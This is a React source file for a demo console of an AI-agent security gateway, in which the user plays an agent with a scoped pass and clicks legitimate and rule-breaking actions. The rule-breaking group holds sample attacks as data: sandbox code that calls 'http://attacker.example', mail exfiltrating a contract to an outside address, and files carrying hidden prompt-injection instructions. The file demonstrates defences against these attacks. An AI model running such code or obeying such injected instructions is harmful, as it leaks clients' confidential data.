// "Be the agent": the user plays an AI agent with a real task and a real pass. Every click is a real request
// through the gateway; the full path of each one is drawn with the same trace as the scenarios.
import React, { useEffect, useState } from "react";
import { api } from "./api.js";
import { t } from "./i18n.js";
import { ApprovalButtons, Id, Level, Rosette, clock, num } from "./ui.jsx";
import { TraceStep } from "./Trace.jsx";
import Icon from "./icons.jsx";

const MISSIONS = [
  { profile: "contract_review", title: "Contract review for client A",
    story: "A law firm's assistant. Client A asked for a risk memo on their acquisition contract. Your pass lets you read client A's files, search case law, ask the model, save memos and e-mail people at the firm or at client A." },
  { profile: "data_task", title: "Data task (can run code)",
    story: "An analyst's assistant that may run Python. Code never runs on the server: each run gets its own throw-away container with no network." },
  { profile: "research", title: "Public legal research",
    story: "A research assistant with public sources only. It may not touch any client's files." },
];

// `expect` is what should happen and why; it is shown before the click so the result is easy to judge.
const ACTIONS = [
  { group: "Normal work", hint: "What the task is for. These should go through.", items: [
    { id: "readA", label: "Read client A's contract", kind: "tool", tool: "doc.read", args: { path: "/clients/A/contracts/acquisition.txt" },
      expect: "ALLOW", note: "Allowed. The document is confidential, so from now on the whole task counts as confidential." },
    { id: "readPdf", label: "Read a contract PDF", kind: "tool", tool: "doc.read", args: { path: "/clients/A/contracts/umowa-uslugi.pdf" },
      expect: "ALLOW", note: "A normal PDF: its text and metadata are checked and nothing is found." },
    { id: "search", label: "Search case law", kind: "tool", tool: "legal_db.search", fields: [["query", "kara umowna odstąpienie"]],
      expect: "ALLOW", note: "Allowed: research is on the pass." },
    { id: "chat", label: "Ask the model about the contract", kind: "chat", fields: [["content", "Wypisz trzy największe ryzyka w tej umowie."]],
      expect: "ALLOW", note: "The last document you read goes to the model as context, checked like any untrusted input." },
    { id: "note", label: "Save an internal memo", kind: "tool", tool: "notes.write", fields: [["title", "Notatka o ryzykach"], ["body", "Opłata za odstąpienie 3%, zakaz konkurencji 36 miesięcy."]],
      expect: "ALLOW", note: "Internal notes may hold confidential data." },
    { id: "mailIn", label: "E-mail a colleague at the firm", kind: "tool", tool: "mail.send", fields: [["to", "kolega@lawfirm.example"], ["subject", "Notatka o ryzykach"], ["body", "Podsumowanie umowy w załączniku."]],
      expect: "ALLOW", note: "Internal mail is cleared for confidential data." },
    { id: "code", label: "Run a calculation in the sandbox", kind: "tool", tool: "code.run", fields: [["code", "print('przetworzone wiersze:', sum(range(1000)))"]],
      expect: "ALLOW", note: "Only on the data task. It runs in an isolated container." },
  ] },
  { group: "Try to break the rules", hint: "What a hijacked or careless agent would do. Each should be stopped, and you see where.", items: [
    { id: "readPdfMeta", label: "Read a PDF from the other side (hidden parts)", kind: "tool", tool: "doc.read", args: { path: "/clients/A/contracts/umowa-od-kontrahenta.pdf" },
      expect: "BLOCK", note: "The page looks clean. The metadata, XMP, a sticky note and a script inside the file carry the attack." },
    { id: "readInj", label: "Read a contract with a hidden instruction", kind: "tool", tool: "doc.read", args: { path: "/clients/A/contracts/acquisition_injected.txt" },
      expect: "BLOCK", note: "The file tells the agent to e-mail it outside. The hidden instruction is cut out or the content withheld." },
    { id: "mailOut", label: "E-mail the contract to an outside address", kind: "tool", tool: "mail.send", fields: [["to", "deal-desk@evil-mergers.com"], ["subject", "Umowa"], ["body", "Pełny tekst umowy …"]],
      expect: "BLOCK", note: "The recipient is not on the pass. The mail server must receive nothing." },
    { id: "mailClient", label: "E-mail client A after reading confidential data", kind: "tool", tool: "mail.send", fields: [["to", "partner@client-A.example"], ["subject", "Umowa"], ["body", "Podsumowanie umowy."]], readFirst: true,
      expect: "BLOCK", note: "The recipient IS allowed, but the task has read confidential data and outside mail is cleared for public only. If the contract has not been read yet, it is read first." },
    { id: "readB", label: "Read client B's NDA", kind: "tool", tool: "doc.read", args: { path: "/clients/B/contracts/nda.txt" },
      expect: "BLOCK", note: "Client B's files are outside this task's pass." },
    { id: "postApproval", label: "Publish a summary on an outside website", kind: "tool", tool: "http.post", fields: [["url", "https://example.org/podsumowanie"], ["body", "Publiczne podsumowanie orzecznictwa o karach umownych."]],
      expect: "PENDING", note: "On the research mission this tool is allowed, but the policy says a person must approve it first. Approve it right here, then do it again." },
    { id: "post", label: "Upload to an external website", kind: "tool", tool: "http.post", fields: [["url", "https://paste.example.net/upload"], ["body", "Podsumowanie umowy."]],
      expect: "BLOCK", note: "This tool is not on the pass at all." },
    { id: "chatSecret", label: "Send the model a password", kind: "chat", fields: [["content", "Zaloguj się za mnie, moje hasło to kacperkochamame"]],
      expect: "BLOCK", note: "A password in the prompt never reaches the model." },
    { id: "codenet", label: "Run code that phones home", kind: "tool", tool: "code.run", fields: [["code", "import urllib.request; urllib.request.urlopen('http://attacker.example', timeout=5)"]],
      expect: "REDACT", note: "On the data task it runs in the sandbox, where the network is cut. Elsewhere code is not on the pass." },
  ] },
];

const EXPECT = { ALLOW: "should pass", REDACT: "should be contained", BLOCK: "should be stopped", PENDING: "needs a person's approval" };

function initialValues() {
  const v = {};
  ACTIONS.forEach((g) => g.items.forEach((a) => (a.fields || []).forEach(([k, d]) => { v[`${a.id}.${k}`] = d; })));
  return v;
}

function responsePreview(res) {
  const r = res.response || {};
  if (r.error && !r.mandate) return { kind: "error", text: r.error.reason_code };
  if (r.result?.withheld) return { kind: "withheld" };
  if (r.choices) return { kind: "model", text: r.choices[0].message.content };
  if (r.result?.sandbox) {
    const err = (r.result.sandbox.stderr || "").trim().split("\n");
    return { kind: "sandbox", text: (r.result.sandbox.stdout || "").trim() || err[err.length - 1] };
  }
  if (r.result?.content) return { kind: "content", text: r.result.content.length > 700 ? `${r.result.content.slice(0, 700)} …` : r.result.content };
  if (r.result) return { kind: "result", text: JSON.stringify(r.result) };
  return null;
}

function Pass({ task, backend, onEnd, onNew }) {
  const m = task.mandate;
  const active = task.status === "active";
  return (
    <div className="pass-card">
      <div className="pass-head">
        <span className="label">{t("Your pass")}</span>
        <span className={`status status-${task.status}`}>{t(task.status)}</span>
      </div>
      <p className="pass-id"><Id>{task.task_id}</Id></p>
      <div className="pass-level">
        <span className="label">{t("Most sensitive data read so far")}</span>
        <Level v={task.classification} />
      </div>
      <dl className="facts">
        <dt>{t("May use")}</dt><dd className="chips">{m.tools.map((x) => <span key={x} className="chip static">{x}</span>)}</dd>
        <dt>{t("May read")}</dt><dd>{m.resources.map((r) => <Id key={r}>{r}</Id>)}</dd>
        <dt>{t("May write to")}</dt><dd>{(m.recipients_allow || []).join(", ") || t("no e-mail recipients")}</dd>
        {task.budget && <><dt>{t("Tokens")}</dt><dd>{t("{a} spent of {b}", { a: num(task.budget.spent), b: num(task.budget.token_limit) })}</dd></>}
        <dt>{t("Expires")}</dt><dd>{clock(task.expires_at)}</dd>
      </dl>
      {backend && (
        <p className="proof-figure small-proof"><b>{backend.mail_sent}</b> <span>{t("e-mails delivered by the mail server")}</span></p>
      )}
      <div className="actions">
        {active && <button className="btn small" onClick={onEnd}>{t("End the task")}</button>}
        <button className="btn small quiet" onClick={onNew}>{t("New task")}</button>
      </div>
      {!active && <p className="note">{t("The task is over, but you can keep clicking: the old pass no longer opens anything.")}</p>}
    </div>
  );
}

export default function Agent() {
  const [profile, setProfile] = useState("contract_review");
  const [task, setTask] = useState(null);
  const [log, setLog] = useState([]);
  const [values, setValues] = useState(initialValues);
  const [open, setOpen] = useState(null);
  const [busy, setBusy] = useState(null);
  const [backend, setBackend] = useState(null);
  const [error, setError] = useState(null);
  const [lastDoc, setLastDoc] = useState(null);
  const [model, setModel] = useState("");
  useEffect(() => {
    api("/admin/models/available").then((list) => {
      const pick = list.find((m) => m.available && m.model.startsWith("main/")) || list.find((m) => m.available);
      if (pick) setModel(pick.model);
    }).catch(() => {});
  }, []);

  const refresh = async (id) => {
    const d = await api(`/admin/console/tasks/${id}`);
    setTask(d);
    setBackend(d.backend);
  };

  const start = async (p = profile) => {
    setError(null);
    try {
      const d = await api("/admin/console/tasks", { method: "POST", body: { profile: p, client: "A" } });
      setLog([]); setLastDoc(null);
      await refresh(d.task_id);
    } catch (e) { setError(e.message); }
  };

  const run = async (a, first = true) => {
    if (!task) return;
    if (first && a.readFirst && task.classification !== "CONFIDENTIAL") {
      await run(ACTIONS[0].items[0], false);  // read client A's contract first, so the task holds confidential data
    }
    setBusy(a.id); setError(null);
    const args = { ...(a.args || {}) };
    (a.fields || []).forEach(([k]) => { args[k] = values[`${a.id}.${k}`]; });
    const body = a.kind === "chat" ? { kind: "chat", content: args.content, context: lastDoc?.content, model } : a.kind === "tool" ? { kind: "tool", tool: a.tool, args } : { kind: a.kind };
    try {
      const res = await api(`/admin/console/tasks/${task.task_id}/act`, { method: "POST", body });
      const m = res.response?.mandate;
      const entry = {
        id: Date.now(), a, res,
        request: a.kind === "chat"
          ? { channel: "model", target: model, args: { prompt: args.content, ...(lastDoc ? { context: lastDoc.path } : {}) } }
          : a.kind === "tool" ? { channel: "tool", target: a.tool, args } : null,
        decision: m || null,
        action: m?.action || (res.response?.error ? "BLOCK" : a.kind === "complete" ? null : "ALLOW"),
        mailDelta: res.backend_after && res.backend_before ? res.backend_after.mail_sent - res.backend_before.mail_sent : 0,
        before: task.classification, after: res.task?.classification,
      };
      setLog((l) => [entry, ...l]);
      const content = res.response?.result?.content;
      if (a.tool === "doc.read" && content) setLastDoc({ path: args.path, content });
      if (res.backend_after) setBackend(res.backend_after);
      await refresh(task.task_id);
    } catch (e) { setError(e.message); }
    setBusy(null);
  };

  const mission = MISSIONS.find((m) => m.profile === (task?.profile || profile)) || MISSIONS[0];
  const allowed = task?.mandate?.tools || [];

  if (!task) {
    return (
      <div className="agent">
        <section className="card mission-pick">
          <p className="eyebrow"><Icon name="agent" size={16} />{t("Step 1 of 2")}</p>
          <h2>{t("Choose your mission")}</h2>
          <p className="muted">{t("You play an AI agent. The app opens a task for you and the gateway issues a pass: what you may read, use and send, for how long and for how many tokens. Then you try things, legal and not, and watch each request go through the gateway.")}</p>
          <div className="missions">
            {MISSIONS.map((m) => (
              <button key={m.profile} className={`mission ${profile === m.profile ? "is-on" : ""}`} onClick={() => setProfile(m.profile)}>
                <b>{t(m.title)}</b><span>{t(m.story)}</span>
              </button>
            ))}
          </div>
          <div className="actions"><button className="btn btn-primary btn-lg" onClick={() => start()}>{t("Start the task")} <Icon name="arrow" size={17} /></button></div>
          {error && <p className="t-block">{error}</p>}
        </section>
      </div>
    );
  }

  return (
    <div className="agent">
      <section className="card mission-bar">
        <div>
          <p className="eyebrow"><Icon name="agent" size={16} />{t("Your mission")}</p>
          <h2>{t(mission.title)}</h2>
          <p className="muted">{t(mission.story)}</p>
        </div>
      </section>

      <div className="agent-grid">
        <aside className="pass">
          <Pass task={task} backend={backend} onEnd={() => run({ id: "complete", label: "End the task", kind: "complete" })} onNew={() => { setTask(null); setLog([]); }} />
        </aside>

        <div className="agent-main">
          {ACTIONS.map((g) => (
            <section className="card action-group" key={g.group}>
              <div className="section-head"><h2>{t(g.group)}</h2><span className="muted small">{t(g.hint)}</span></div>
              <ul className="action-list">
                {g.items.map((a) => {
                  const outside = a.kind === "tool" && !allowed.includes(a.tool);
                  const isOpen = open === a.id;
                  return (
                    <li key={a.id} className={`action ${outside ? "is-outside" : ""}`}>
                      <div className="action-top">
                        <div className="action-main">
                          <span className="action-label">{t(a.label)}</span>
                          <span className="action-note">{t(a.note)}</span>
                          <span className="action-meta">
                            <span className={`chip static chip-${(outside && a.expect === "ALLOW" ? "BLOCK" : a.expect).toLowerCase()}`}>{t(outside && a.expect === "ALLOW" ? "not on your pass" : EXPECT[a.expect])}</span>
                            {a.fields && <button className="link" onClick={() => setOpen(isOpen ? null : a.id)}>{isOpen ? t("Hide details") : t("Change the details")}</button>}
                          </span>
                        </div>
                        <button className="btn" disabled={busy !== null} onClick={() => run(a)}>{busy === a.id ? t("Running…") : t("Do it")}</button>
                      </div>
                      {isOpen && (
                        <div className="action-fields">
                          {a.fields.map(([k]) => {
                            const key = `${a.id}.${k}`;
                            return <label key={k} className="field"><span>{k}</span><input value={values[key]} onChange={(e) => setValues((x) => ({ ...x, [key]: e.target.value }))} /></label>;
                          })}
                        </div>
                      )}
                    </li>
                  );
                })}
              </ul>
            </section>
          ))}
          {error && <p className="t-block">{error}</p>}
        </div>
      </div>

      <section className="agent-log">
        <div className="section-head"><h2>{t("What happened, request by request")}</h2>{log.length > 0 && <span className="muted small">{t("newest first")}</span>}</div>
        {log.length === 0 ? (
          <div className="placeholder"><Rosette size={56} /><p>{t("Press “Do it” on any action. Its whole path through the gateway appears here.")}</p></div>
        ) : log.map((e, i) => (
          <TraceStep key={e.id} animate={i === 0} title={e.a.label} why={e.a.note} request={e.request} decision={e.decision}
            response={responsePreview(e.res)} ran={e.decision?.tool_invoked} action={e.action}
            rule={e.decision?.rule_id || e.res.response?.error?.reason_code} sandbox={e.res.response?.result?.sandbox}
            extra={<>
              {e.after && e.after !== e.before && <p className="taint small">{t("Your task now carries {level} data. From here on, nothing it produces may go anywhere cleared for less.", { level: t(e.after.toLowerCase()) })}</p>}
              {e.decision?.rule_id === "APPROVAL-001" && (
                <div className="appr-inline">
                  <span>{t("Held until a person approves this exact call. Approve it, then press “Do it” again: it runs once.")}</span>
                  <ApprovalButtons id={e.decision.findings.find((f) => f.rule_id === "APPROVAL-001")?.detail?.approval_id} onDone={(v) => setLog((l) => l.map((x) => (x.id === e.id ? { ...x, approved: v } : x)))} />
                  {e.approved && <span className={e.approved === "approve" ? "t-allow" : "t-block"}>{e.approved === "approve" ? t("Approved. Press “Do it” again.") : t("Denied.")}</span>}
                </div>
              )}
              {e.a.tool === "mail.send" && <p className={`small ${e.mailDelta > 0 ? "" : "t-allow"}`}>{e.mailDelta > 0 ? t("The mail server delivered it.") : t("The mail server received nothing.")}</p>}
            </>} />
        ))}
      </section>
    </div>
  );
}
